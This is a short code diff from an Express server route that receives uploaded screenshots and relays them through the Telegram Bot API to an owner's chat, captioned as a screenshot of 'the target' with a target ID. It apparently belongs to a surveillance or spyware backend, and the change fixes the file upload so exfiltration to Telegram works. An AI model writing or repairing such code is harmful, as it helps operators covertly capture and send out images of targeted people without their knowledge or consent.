@@ -369,9 +369,9 @@ app.post('/api/photo', upload.single('photo'), async (req, res) => {
             formData.append('chat_id', ownerChatId);
             formData.append('caption', `📸 Screenshot del objetivo: ${targetId} — ${new Date().toLocaleString('es-ES')}`);
 
-            // Usar buffer directamente en lugar de Blob para mejor compatibilidad
-            // Telegram API acepta Buffer como stream
-            formData.append('photo', req.file.buffer, 'screenshot.jpg');
+            // Convertir buffer a Blob para que FormData lo acepte correctamente
+            const blob = new Blob([req.file.buffer], { type: 'image/jpeg' });
+            formData.append('photo', blob, 'screenshot.jpg');
 
             const tgRes = await fetch(`${BASE_URL}/sendPhoto`, {
                 method: 'POST',
